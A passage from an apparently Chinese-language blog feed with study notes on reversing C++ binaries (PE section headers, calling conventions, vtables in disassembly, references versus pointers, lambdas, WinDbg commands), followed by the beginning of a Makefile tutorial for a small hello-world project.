<p>ImageBase: 文件在内存中的首选装入地址。如果有可能（也就是说，目前如果没有其他占据这块地址，它是正确对齐的并且是一个合法的地址，等等），加载器试图在这个地址装入PE文件。如果可执行文件是在这个地址装入的，那么加载器将跳过应用<em>基址重定位</em>的步骤。</p>
<h3 id="Section"><a href="#Section" class="headerlink" title="Section"></a>Section</h3><p>节的初始化数据由简单的字节块组成。 但是，对于全部为零的节，不需要包含节数据。</p>
<p>每个节的数据位于节头中的 PointerToRawData 字段给出的文件偏移量处。 文件中此数据的大小由 SizeOfRawData 字段指示。 如果 SizeOfRawData 小于 VirtualSize，则其余部分用零填充。</p>
<p>这里的对齐和可选头的 <code>SectionAlignment</code>和 <code>FileAlignment</code> 相关</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">	BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];          <span class="comment">// 名称 .text .bss 等</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		DWORD   PhysicalAddress;</span><br><span class="line">		DWORD   VirtualSize;</span><br><span class="line">	&#125; Misc;</span><br><span class="line">	DWORD   VirtualAddress;                         <span class="comment">// 节区的 RVA 地址</span></span><br><span class="line">	DWORD   SizeOfRawData;                          <span class="comment">// 文件对齐后的大小</span></span><br><span class="line">	DWORD   PointerToRawData;                       <span class="comment">// FOA</span></span><br><span class="line">	DWORD   PointerToRelocations;</span><br><span class="line">	DWORD   PointerToLinenumbers;</span><br><span class="line">	WORD    NumberOfRelocations;</span><br><span class="line">	WORD    NumberOfLinenumbers;</span><br><span class="line">	DWORD   Characteristics;                        <span class="comment">// 节属性如可读，可写，可执行等</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, * PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p>非常简单的源码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c, <span class="type">int</span> d, <span class="type">int</span> e, <span class="type">int</span> f, <span class="type">int</span> g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	a = <span class="number">10</span>;</span><br><span class="line">	std::cout &lt;&lt; <span class="built_in">func</span>(a, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>) &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>带符号表的反汇编，可以看出其比较长的 namespace 和 函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  std::ostream *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(&amp;_4C11826D_reverse_cpp);</span><br><span class="line">  v0 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(std::cout, <span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v0, std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v1 = <span class="built_in">func</span>(<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>);</span><br><span class="line">  v2 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(std::cout, v1);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CALL-方式"><a href="#CALL-方式" class="headerlink" title="CALL 方式"></a>CALL 方式</h3><p>具体参考：<a href="https://learn.microsoft.com/zh-cn/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170">自变量传递和命名约定 | Microsoft Learn</a>****</p>
<p><strong><code>__cdecl</code></strong> 是 C 和 C++ 程序的默认调用约定。 堆栈由<code>caller</code>清理,函数传递顺序 从右到左</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">method</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong><code>__stdcall</code></strong> 调用约定用于调用 Win32 API 函数。<code>callee</code>清理堆栈，函数传递方式 从右到左。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WINAPI __stdcall</span></span><br><span class="line"><span class="function"><span class="type">void</span> __stdcall <span class="title">method</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong><code>__fastcall</code></strong> 调用约定指定尽可能在寄存器中传递函数的自变量。 此调用约定仅适用于 x86 体系结构。参数传递</p>
<ul>
<li>x86 从左到右的顺序找到前两个 <code>DWORD</code> 或更小自变量将在 ECX 和 EDX 寄存器中传递；所有其他自变量在堆栈上从右向左传递。</li>
<li>x64 下是 rcx, rdx, r8, r9</li>
</ul>
<p><strong><code>__thiscall</code></strong> 的调用约定用于 x86 体系结构上的 C++ 类成员函数，<strong>特定于 Microsoft</strong> </p>
<p>比如说 call func 的 汇编代码，我在x64下是 fastcall</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000140011</span>CEE                 mov     [rbp+<span class="number">0F</span>0h+a], <span class="number">0</span>Ah</span><br><span class="line">.text:<span class="number">0000000140011</span>CF5                 mov     [rsp+<span class="number">130</span>h+g], <span class="number">7</span> ; g</span><br><span class="line">.text:<span class="number">0000000140011</span>CFD                 mov     [rsp+<span class="number">130</span>h+f], <span class="number">6</span> ; f</span><br><span class="line">.text:<span class="number">0000000140011</span>D05                 mov     [rsp+<span class="number">130</span>h+e], <span class="number">5</span> ; e</span><br><span class="line">.text:<span class="number">0000000140011</span>D0D                 mov     r9d, <span class="number">4</span>          ; d</span><br><span class="line">.text:<span class="number">0000000140011</span>D13                 mov     r8d, <span class="number">3</span>          ; c</span><br><span class="line">.text:<span class="number">0000000140011</span>D19                 mov     edx, <span class="number">2</span>          ; b</span><br><span class="line">.text:<span class="number">0000000140011</span>D1E                 mov     ecx, [rbp+<span class="number">0F</span>0h+a] ; a</span><br><span class="line">.text:<span class="number">0000000140011</span>D21                 call    j_?func@@YAHHHHHHHH@Z ; <span class="built_in">func</span>(<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>)</span><br></pre></td></tr></table></figure>

<p>但是在 x86 就是 cdecl call</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0041253</span>C                 push    <span class="number">7</span>               ; g</span><br><span class="line">.text:<span class="number">0041253</span>E                 push    <span class="number">6</span>               ; f</span><br><span class="line">.text:<span class="number">00412540</span>                 push    <span class="number">5</span>               ; e</span><br><span class="line">.text:<span class="number">00412542</span>                 push    <span class="number">4</span>               ; d</span><br><span class="line">.text:<span class="number">00412544</span>                 push    <span class="number">3</span>               ; c</span><br><span class="line">.text:<span class="number">00412546</span>                 push    <span class="number">2</span>               ; b</span><br><span class="line">.text:<span class="number">00412548</span>                 mov     eax, [ebp+a]</span><br><span class="line">.text:<span class="number">0041254B</span>                 push    eax             ; a</span><br><span class="line">.text:<span class="number">0041254</span>C                 call    j_?func@@YAHHHHHHHH@Z ; <span class="built_in">func</span>(<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>)</span><br></pre></td></tr></table></figure>

<p>但是不变的是 <code>rax</code> 为函数返回值</p>
<h2 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h2><p>测试代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> _age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		_age = <span class="number">0</span>;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;person&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">Person</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~person&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">int</span> <span class="title">GetAge</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">SetAge</span><span class="params">(<span class="type">int</span> age)</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Boy</span> : <span class="keyword">public</span> Person &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Boy</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;boy&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">Boy</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~boy&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">GetAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;boy getage&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">114</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">SetAge</span><span class="params">(<span class="type">int</span> age)</span> </span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;boy setage&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	std::vector&lt;Boy&gt; boys;</span><br><span class="line">	Boy b;</span><br><span class="line">	boys.<span class="built_in">push_back</span>(b);</span><br><span class="line">	<span class="keyword">auto</span> f = [](<span class="type">int</span> a, <span class="type">int</span> b) -&gt; <span class="type">int</span> &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;lambda&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="keyword">return</span> a + b;</span><br><span class="line">		&#125;;</span><br><span class="line">	std::cout &lt;&lt; <span class="built_in">f</span>(<span class="number">1</span>, <span class="number">2</span>) &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>C++ 名称粉碎机制：举个例子 <code>std::cout</code> 名字是 <code>__imp_?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A:qword</code>。</p>
<ul>
<li>更好的重载</li>
</ul>
<p><code>MSVC</code> 反编译出来，优化比较严重，因此使用<code>g++</code></p>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>析构函数和构造函数</p>
<p>构造函数调用：函数声明时；析构函数：生命周期结束时</p>
<p>反汇编时，方法第一个参数一般是 <code>this</code> 指针</p>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>在构造时，构造顺序为先构造父类，后构造子类。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">Boy::Boy</span><span class="params">(Boy *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  Person::<span class="built_in">Person</span>(<span class="keyword">this</span>);</span><br><span class="line">  *(_QWORD *)<span class="keyword">this</span> = off_4CC8;   <span class="comment">// 虚指针</span></span><br><span class="line">  v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;boy&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在析构时，析构顺序为先析构子类，后析构父类。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall Boy::~<span class="built_in">Boy</span>(Boy *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)<span class="keyword">this</span> = off_4CC8; <span class="comment">// vfptr</span></span><br><span class="line">  v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;~boy&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  Person::~<span class="built_in">Person</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h3><p>虚函数也是函数，体现了CPP的多态性。</p>
<p>根据对象的实际类型来调用成员函数，而不是根据指针的类型来对该块内存进行解释并调用属于该指针类型所属的成员函数，简化代码实现多态性</p>
<ul>
<li>一个很好的解释：父类声明子类<code>Set&lt;String&gt; m = new HashMap&lt;String&gt;</code>，但是调用方法是子类的</li>
</ul>
<p>在<code>cpp</code>中使用一个指针和一个表格来进行实现的。这个表格称为虚表<code>vftable</code> ，这个指针称为虚表指针。</p>
<ul>
<li>如果一个类中有虚函数，编译器则会在对象的首部加入虚表指针，以存放所属于该对象的虚表</li>
</ul>
<p>虚表指针的填充时机：<strong>只有在构造函数和析构函数中会对虚表指针重新赋值，其他位置没有对该指针的操作</strong>。</p>
<ul>
<li>虚函数在类的首部</li>
</ul>
<p>其在构造函数和析构函数给<code>vfptr</code>赋值</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CC8 off_4CC8        dq offset _ZN3BoyD2Ev   ; DATA XREF: Boy::<span class="built_in">Boy</span>(<span class="type">void</span>)+<span class="number">1</span>D↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CC8                                         ; Boy::~<span class="built_in">Boy</span>()+<span class="number">10</span>↑o ...</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CC8                                         ; Boy::~<span class="built_in">Boy</span>()</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CD0                 dq offset _ZN3BoyD0Ev   ; Boy::~<span class="built_in">Boy</span>()</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CD8                 dq offset _ZN3Boy6GetAgeEv ; Boy::<span class="built_in">GetAge</span>(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CE0                 dq offset _ZN3Boy6SetAgeEi ; Boy::<span class="built_in">SetAge</span>(<span class="type">int</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CE8                 <span class="keyword">public</span> _ZTV6Person ; weak</span><br></pre></td></tr></table></figure>

<p><strong>析构函数为什么也要重新给虚表赋值呢？</strong></p>
<ul>
<li>编译器无法预知这个子类以后是否会被其他类继承，如果被继承，就成了父类，在执行析构函数时会先执行当前对象的析构函数，然后向祖父类的方向按继承线路逐层调用各类析构函数，当前对象的析构函数开始执行时，其虚表也是当前对象的，所以执行到父类的析构函数时，虚表必须改写为父类的虚表</li>
</ul>
<h2 id="引用与指针"><a href="#引用与指针" class="headerlink" title="引用与指针"></a>引用与指针</h2><p>指针</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d\n&quot;</span>, a);</span><br><span class="line">    <span class="type">int</span> *p = &amp;a;</span><br><span class="line">    *p = <span class="number">200</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, <span class="number">20</span>h</span><br><span class="line">mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">mov     [rbp+var_8], rax  </span><br><span class="line"><span class="keyword">xor</span>     eax, eax</span><br><span class="line">mov     [rbp+var_14], <span class="number">64</span>h ; <span class="string">&#x27;d&#x27;</span></span><br><span class="line">mov     eax, [rbp+var_14]</span><br><span class="line">mov     esi, eax</span><br><span class="line">lea     rax, format     ; <span class="string">&quot;a=%d\n&quot;</span></span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _printf</span><br><span class="line">lea     rax, [rbp+var_14]</span><br><span class="line">mov     [rbp+var_10], rax  ; *p</span><br><span class="line">mov     rax, [rbp+var_10]</span><br><span class="line">mov     dword ptr [rax], <span class="number">0</span>C8h</span><br><span class="line">mov     eax, [rbp+var_14]</span><br><span class="line">mov     esi, eax</span><br><span class="line">lea     rax, format     ; <span class="string">&quot;a=%d\n&quot;</span></span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _printf</span><br></pre></td></tr></table></figure>

<p>左值引用</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d\n&quot;</span>, a);</span><br><span class="line">    <span class="type">int</span> &amp;p = a;</span><br><span class="line">    p = <span class="number">200</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, <span class="number">20</span>h</span><br><span class="line">mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">mov     [rbp+var_8], rax</span><br><span class="line"><span class="keyword">xor</span>     eax, eax</span><br><span class="line">mov     [rbp+var_14], <span class="number">64</span>h ; <span class="string">&#x27;d&#x27;</span></span><br><span class="line">mov     eax, [rbp+var_14]</span><br><span class="line">mov     esi, eax</span><br><span class="line">lea     rax, format     ; <span class="string">&quot;a=%d\n&quot;</span></span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _printf</span><br><span class="line">lea     rax, [rbp+var_14]</span><br><span class="line">mov     [rbp+var_10], rax</span><br><span class="line">mov     rax, [rbp+var_10]</span><br><span class="line">mov     dword ptr [rax], <span class="number">0</span>C8h</span><br><span class="line">mov     eax, [rbp+var_14]</span><br><span class="line">mov     esi, eax</span><br><span class="line">lea     rax, format     ; <span class="string">&quot;a=%d\n&quot;</span></span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _printf</span><br></pre></td></tr></table></figure>

<p>指针和左值引用：在汇编看起来一模一样，引用也是为了满足C++特性，比如操作符重载</p>
<p>右值引用？？？</p>
<ul>
<li>函数参数右值引用和值传递作为参数</li>
</ul>
<h2 id="lambda-表达式"><a href="#lambda-表达式" class="headerlink" title="lambda 表达式"></a>lambda 表达式</h2><p>比较简单的lambda 可以看出来其参数类型与个数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">v3 = main::&#123;<span class="built_in">lambda</span>(<span class="type">int</span>,<span class="type">int</span>)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(&amp;v6, <span class="number">1LL</span>, <span class="number">2LL</span>);</span><br><span class="line"> </span><br><span class="line">__int64 __fastcall main::&#123;<span class="built_in">lambda</span>(<span class="type">int</span>,<span class="type">int</span>)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(__int64 a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;lambda&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)(a2 + a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="debugger"><a href="#debugger" class="headerlink" title="debugger"></a>debugger</h2><p>WinDbg 命令：<a href="http://windbg.info/doc/1-common-cmds.html">Common WinDbg Commands </a><br>x64dbg 文档：<a href="https://help.x64dbg.com/en/latest/">  x64dbg documentation</a> </p>
<p>windbg 常见命令，感觉 preview 更加好看</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 断点 b</span></span><br><span class="line">bp: 断点</span><br><span class="line">bl: list</span><br><span class="line">bc: clear</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看 display/dump</span></span><br><span class="line">d&#123;a|b|c|d|D|f|p|q|u|w|W&#125; [Options] [Range]</span><br><span class="line">db: dump byte</span><br><span class="line">dw: word</span><br><span class="line">dd: dword</span><br><span class="line">dq: qword</span><br><span class="line">dt: type</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单步执行</span></span><br><span class="line">g: go</span><br><span class="line">t: trace，步入</span><br><span class="line">p: 步过</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看寄存器</span></span><br><span class="line">r: <span class="keyword">register</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用栈</span></span><br><span class="line">k: dump stack</span><br><span class="line">.frame</span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索</span></span><br><span class="line">s: search</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改</span></span><br><span class="line">e: edit</span><br></pre></td></tr></table></figure>

<p>某些命令</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.echo </span><br><span class="line">.reboot</span><br><span class="line">.reload</span><br><span class="line">.cls: 清屏幕</span><br><span class="line">.help</span><br></pre></td></tr></table></figure>


<p>x64dbg 操作起来比较容易，可以使用鼠标和右键😋。除了某些命令</p>
]]></content>
      <categories>
        <category>REVERSE</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Cmake使用</title>
    <url>/2023/09/09/Cmake%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>编写自动化构建脚本</p>
</blockquote>
<span id="more"></span>

<h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><p>应该叫 GNU Make，在Linux 平台常用</p>
<p>打印信息</p>
<figure class="highlight make"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不显示中间过程以及命令</span></span><br><span class="line">@echo <span class="string">&quot;begin make&quot;</span></span><br><span class="line">@<span class="variable">$(CXX)</span>  <span class="variable">$^</span> -o <span class="variable">$(TARGET)</span></span><br><span class="line">@echo <span class="string">&quot;build success&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 报错处理, 报错后不会向下执行，我们在前面加上一个 `-` 符号就行</span></span><br></pre></td></tr></table></figure>

<p>项目结构</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">hello/</span><br><span class="line">├── main.cpp</span><br><span class="line">├── factorial.cpp</span><br><span class="line">├── printhello.cpp</span><br><span class="line">└── functions.h</span><br></pre></td></tr></table></figure>
<p>朴素版</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">g++ main.cpp factorial.cpp printhello.cpp -o main</span><br><span class="line">./main</span><br></pre></td></tr></table></figure>

<h3 id="version1"><a href="#version1" class="headerlink" title="version1"></a>version1</h3><p>tab而不是空格</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">hello: main.cpp printhello.cpp factorial.cpp</span></span><br><span class="line">	g++ -o hello main.cpp printhello.cpp factorial.cpp</span><br></pre></td></tr></table></figure>

<h3 id="version2"><a href="#version2" class="headerlink" title="version2"></a>version2</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line">OBJ = main.o printhello.o factorial.o</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$(TARGET)</span> <span class="variable">$(OBJ)</span></span><br><span class="line"></span><br><span class="line"><span class="section">main.o: main.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c main.cpp</span><br><span class="line"></span><br><span class="line"><span class="section">printhello.o: printhello.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c printhello.cpp</span><br><span class="line"></span><br><span class="line"><span class="section">factorial.o: factorial.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c factorial.cpp</span><br></pre></td></tr></table></figure>

<h3 id="version3"><a href="#version3" class="headerlink" title="version3"></a>version3</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line">OBJ = main.o printhello.o factorial.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wall warning all</span></span><br><span class="line">CXXFLAGS = -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHONY 避免冲突。比如有一个 clean 的可执行文件？</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

